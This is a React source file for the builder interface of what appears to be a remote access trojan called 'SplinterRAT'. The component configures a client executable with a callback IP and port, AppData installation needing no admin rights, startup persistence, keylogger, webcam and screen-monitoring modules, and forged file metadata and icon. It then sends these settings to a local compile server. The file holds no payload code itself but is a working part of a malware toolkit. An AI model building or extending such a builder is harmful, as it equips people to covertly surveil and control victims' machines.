import React, {useState} from 'react';
import {
    Box,
    Button,
    Checkbox,
    Chip,
    Divider,
    FormControlLabel,
    Grid,
    MenuItem,
    Paper,
    Select,
    Tab,
    Tabs,
    TextField,
    Typography
} from '@mui/material';
import {Upload} from "@mui/icons-material";
import {useDispatch, useSelector} from 'react-redux';
import {
    setCopyright,
    setExecutableName,
    setFileDescription,
    setFolderName,
    setInstallationPath,
    setIp,
    setMutex,
    setOriginalName,
    setPort,
    setProductName,
    setStartupName,
    setTag,
    setTiming,
    setVersionOfFileAndProduct,
    toggleInstallation,
    toggleKeylogger,
    toggleScreenMonitoring,
    toggleStartup,
    toggleWebcam,
} from '@redux/slices/compilerSlice';

import { toast } from 'react-toastify';
import {setFileToDownload} from "@redux/slices/clientSlice";



function CompilerGUI() {
    const dispatch = useDispatch();
    const compilerState = useSelector(state => state.compiler);

    const generateJSON = () => {
        return {
            webcamChecked: compilerState.webcamChecked,
            keyloggerChecked: compilerState.keyloggerChecked,
            screenMonitoringChecked: compilerState.screenMonitoringChecked,
            tag: compilerState.tag,
            mutex: compilerState.mutex,
            ip: compilerState.ip,
            port: compilerState.port,
            timing: compilerState.timing,
            executableName: compilerState.executableName,
            folderName: compilerState.folderName,
            isInstallationEnabled: compilerState.isInstallationEnabled,
            isStartupEnabled: compilerState.isStartupEnabled,
            startupName: compilerState.startupName,
            fileDescription: compilerState.fileDescription,
            versionOfFileAndProduct: compilerState.versionOfFileAndProduct,
            productName: compilerState.productName,
            copyright: compilerState.copyright,
            originalName: compilerState.originalName,
            installationPath: compilerState.installationPath
        };
    }

    const handleCompileClick = async () => {
        const jsonData = generateJSON();
        console.log(jsonData);

        const toastId = toast.loading("Compiling...");

        try {
            const response = await fetch('http://127.0.0.1:3055/compile', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(jsonData)
            });

            const data = await response.json();

            switch (response.status) {
                case 200: // HTTP 200 OK
                    if (data.status === 0) {
                        dispatch(setFileToDownload(data));
                        toast.update(toastId, { render: "Compilation successful!", type: "success", isLoading: false, autoClose: 5000, closeOnClick: true, closeButton: true });
                    } else {
                        const errorMessage = data.message || 'Unexpected server response.';
                        toast.update(toastId, { render: errorMessage, type: "error", isLoading: false, autoClose: 5000, closeOnClick: true, closeButton: true });
                    }
                    break;
                case 409: // HTTP 409 Conflict
                    const conflictMessage = data.message || 'Compilation already in progress.';
                    toast.update(toastId, { render: conflictMessage, type: "error", isLoading: false, autoClose: 5000, closeOnClick: true, closeButton: true });
                    break;
                case 500: // HTTP 500 Internal Server Error
                    const errorMessage = data.message || 'Error during compilation.';
                    toast.update(toastId, { render: errorMessage, type: "error", isLoading: false, autoClose: 5000, closeOnClick: true, closeButton: true });
                    break;
                default:
                    toast.update(toastId, { render: 'Server error: ' + response.status, type: "error", isLoading: false, autoClose: 5000, closeOnClick: true, closeButton: true });
                    break;
            }

        } catch (error) {
            // For unexpected errors (e.g., network issues)
            toast.update(toastId, { render: 'Unexpected error: ' + error.message, type: "error", isLoading: false, autoClose: 5000, closeOnClick: true, closeButton: true });
        }
    }








    const [currentTab, setCurrentTab] = useState(0);
    const isFormValid = () => {
        return compilerState.tag && compilerState.ip && compilerState.port;
    }

    return (
        <Paper elevation={10} sx={{height: '82vh', maxHeight: '82vh', overflow: 'auto', maxWidth: '100%'}}>
            <Tabs value={currentTab} onChange={(event, newValue) => setCurrentTab(newValue)}>
                <Tab label="Identification"/>
                <Tab label="Installation"/>
            </Tabs>

            <Box sx={{maxHeight: '65vh', width: '100%'}}>
                {currentTab === 0 && (
                    <Box sx={{display: 'flex', flexDirection: 'column', gap: '1vh', p: 2}}>
                        <Divider sx={{margin: '0.5rem 0'}} textAlign="left">
                            <Chip label="Identification"/>
                        </Divider>
                        <Box sx={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
                            <Box sx={{flex: '1 1 calc(50% - 1rem)', display: 'flex'}}>
                                <TextField
                                    label="Mutex"
                                    value={compilerState.mutex}
                                    onChange={(e) => dispatch(setMutex(e.target.value))}
                                    placeholder="2f3dc5e1-18f0-4167-baf1-ddb47cb8d346"
                                    helperText="Mutex is used to avoid executing the same client multiple times. It's recommended to be autogenerated"
                                    fullWidth
                                />
                            </Box>
                            <Box sx={{flex: '1 1 calc(40% - 1rem)'}}>
                                <TextField
                                    label="Tag name"
                                    value={compilerState.tag}
                                    onChange={(e) => dispatch(setTag(e.target.value))}
                                    placeholder="Client"
                                    helperText="Client tag for connection identification"
                                    fullWidth
                                />
                            </Box>
                            <Box sx={{flex: '1 1 calc(20% - 1rem)'}}>
                                <TextField
                                    label="IP address"
                                    value={compilerState.ip}
                                    onChange={(e) => dispatch(setIp(e.target.value))}
                                    placeholder="127.0.0.1"
                                    helperText="IP address (IPv4 only supported)"
                                    fullWidth
                                />
                            </Box>
                            <Box sx={{flex: '1 1 calc(20% - 1rem)'}}>
                                <TextField
                                    label="Port"
                                    value={compilerState.port}
                                    onChange={(e) => dispatch(setPort(e.target.value))}
                                    placeholder="3055"
                                    helperText="Port (1024 to 65536)"
                                    fullWidth
                                />
                            </Box>
                            <Box sx={{flex: '1 1 calc(20% - 1rem)'}}>
                                <TextField
                                    label="Delay"
                                    value={compilerState.timing}
                                    onChange={(e) => dispatch(setTiming(e.target.value))}
                                    placeholder="10000"
                                    helperText="Retry delay. The time it will take the client to retry a connection (ms)"
                                    fullWidth
                                />
                            </Box>
                        </Box>
                        <Divider textAlign="left">
                            <Chip label="Installation"/>
                        </Divider>
                        <Box sx={{flex: '1'}}>
                            <FormControlLabel
                                control={<Checkbox
                                    checked={compilerState.isInstallationEnabled}
                                    onChange={() => dispatch(toggleInstallation())}
                                />}
                                label="Install"
                            />
                            <FormControlLabel
                                control={<Checkbox
                                    checked={compilerState.isStartupEnabled}
                                    onChange={() => dispatch(toggleStartup())}
                                />}
                                label="Startup"
                            />
                        </Box>
                        <Box sx={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
                            <Box sx={{flex: '1 1 calc(33.33% - 1rem)'}}>
                                <Select
                                    fullWidth
                                    disabled={!compilerState.isInstallationEnabled}
                                    value={2}
                                    onChange={(event) => dispatch(setInstallationPath(event.target.value))}
                                >
                                    <MenuItem value="0">Program files (x86)</MenuItem>
                                    <MenuItem value="1">System directory</MenuItem>
                                    <MenuItem value="2">AppData</MenuItem>
                                </Select>
                                <Typography variant="caption">Path where the client will be installed (AppData: no admin
                                    privileges required)</Typography>
                            </Box>
                            <Box sx={{flex: '1 1 calc(33.33% - 1rem)'}}>
                                <TextField
                                    label="Folder name"
                                    value={compilerState.folderName}
                                    onChange={(e) => dispatch(setFolderName(e.target.value))}
                                    placeholder="client"
                                    helperText="Folder name where the client will be installed"
                                    fullWidth
                                    disabled={!compilerState.isInstallationEnabled}
                                />
                            </Box>
                            <Box sx={{flex: '1 1 calc(33.33% - 1rem)'}}>
                                <TextField
                                    label="Executable name"
                                    value={compilerState.executableName}
                                    onChange={(e) => dispatch(setExecutableName(e.target.value))}
                                    placeholder="client.exe"
                                    helperText="Executable name inside installation folder"
                                    fullWidth
                                    disabled={!compilerState.isInstallationEnabled}
                                />
                            </Box>
                        </Box>
                        <Box sx={{display: 'flex', gap: '1rem', flexWrap: 'wrap', marginTop: '1rem'}}>
                            <Box sx={{flex: '1 1 calc(100% - 1rem)'}}>
                                <TextField
                                    label="Startup name"
                                    value={compilerState.startupName}
                                    onChange={(e) => dispatch(setStartupName(e.target.value))}
                                    placeholder="ClientStartup"
                                    helperText="Name of the startup file"
                                    fullWidth
                                    disabled={!compilerState.isStartupEnabled}
                                />
                            </Box>
                        </Box>
                    </Box>
                )}
                {currentTab === 1 && (
                    <Box sx={{display: 'flex', flexDirection: 'column', gap: '1vh', pl: 2, pr: 2}}>
                        <Divider sx={{margin: '1rem 0'}} textAlign="left">
                            <Chip label="Modules"/>
                        </Divider>
                        <Box sx={{display: 'flex', gap: '1rem'}}>
                            <FormControlLabel
                                control={<Checkbox
                                    checked={compilerState.webcamChecked}
                                    onChange={() => dispatch(toggleWebcam())}
                                />}
                                label="Webcam"
                            />
                            <FormControlLabel
                                control={<Checkbox
                                    checked={compilerState.keyloggerChecked}
                                    onChange={() => dispatch(toggleKeylogger())}
                                />}
                                label="Keylogger"
                            />
                            <FormControlLabel
                                control={<Checkbox
                                    checked={compilerState.screenMonitoringChecked}
                                    onChange={() => dispatch(toggleScreenMonitoring())}
                                />}
                                label="Screen monitoring"
                            />
                        </Box>

                        <Divider sx={{margin: '0.5rem 0'}} textAlign="left">
                            <Chip label="Assembly"/>
                        </Divider>
                        <Grid container spacing={2}>
                            <Grid item xs={6}>
                                <TextField
                                    fullWidth
                                    value={compilerState.fileDescription}
                                    onChange={(e) => dispatch(setFileDescription(e.target.value))}
                                    placeholder="This is the best client in the world!"
                                    label="File Description"
                                    sx={{ marginBottom: 2 }}
                                />
                                <TextField
                                    fullWidth
                                    value={compilerState.version}
                                    onChange={(e) => dispatch(setVersionOfFileAndProduct(e.target.value))}
                                    placeholder="1.0.0.0"
                                    label="Version of File and Product"
                                    sx={{ marginBottom: 2 }}
                                />
                                <TextField
                                    value={compilerState.originalName}
                                    onChange={(e) => dispatch(setOriginalName(e.target.value))}
                                    placeholder="client.exe"
                                    fullWidth
                                    label="Original Name"

                                />
                                <Button variant="outlined" startIcon={<Upload/>} sx={{marginTop: 2}}>
                                    Upload Icon
                                </Button>
                            </Grid>
                            <Grid item xs={6}>
                                <TextField
                                    value={compilerState.productName}
                                    onChange={(e) => dispatch(setProductName(e.target.value))}
                                    placeholder="SplinterRAT client"
                                    fullWidth
                                    label="Product Name"
                                    sx={{ marginBottom: 2 }}
                                />
                                <TextField
                                    value={compilerState.copyright}
                                    onChange={(e) => dispatch(setCopyright(e.target.value))}
                                    placeholder="SplinterRAT ©"
                                    fullWidth
                                    label="Copyright"
                                />

                            </Grid>
                        </Grid>
                        <Button
                            variant="outlined"
                            color="success"
                            size="large"
                            sx={{marginTop: 2}}
                            onClick={handleCompileClick}
                            disabled={!isFormValid()}
                        >
                            Compile
                        </Button>
                    </Box>
                )}
            </Box>
        </Paper>
    );
}

export default CompilerGUI;
